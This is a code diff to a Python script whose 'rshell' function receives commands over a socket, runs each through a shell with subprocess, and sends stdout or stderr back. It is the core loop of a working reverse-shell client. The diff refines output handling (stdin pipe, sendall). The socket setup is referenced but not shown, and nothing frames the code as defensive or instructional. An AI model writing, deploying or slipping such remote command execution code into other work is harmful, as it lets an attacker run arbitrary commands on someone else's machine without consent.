@@ -45,15 +45,18 @@ def socketStart():
 
 def rshell(s):
     while True:
-        command = s.recv(1024).decode('utf-8')
+        command = s.recv(1024).decode('utf-8').rstrip('\n')
         print("RShell command: {}".format(command))
         if command.lower() == 'exit':
             break
-        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        results, errors = output.communicate()
-        # ternary operator
-        s.send(results if results else errors)
-        print("RShell results: {}".format(results.decode('utf-8')))
+        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        results = output.stdout.read()
+        errors = output.stderr.read()
+        # print("RShell results: {}".format(results.decode('utf-8') if results else errors.decode('utf-8')))
+
+        s.sendall(results if results else errors)
+
+
 
 
 if __name__ == "__main__":
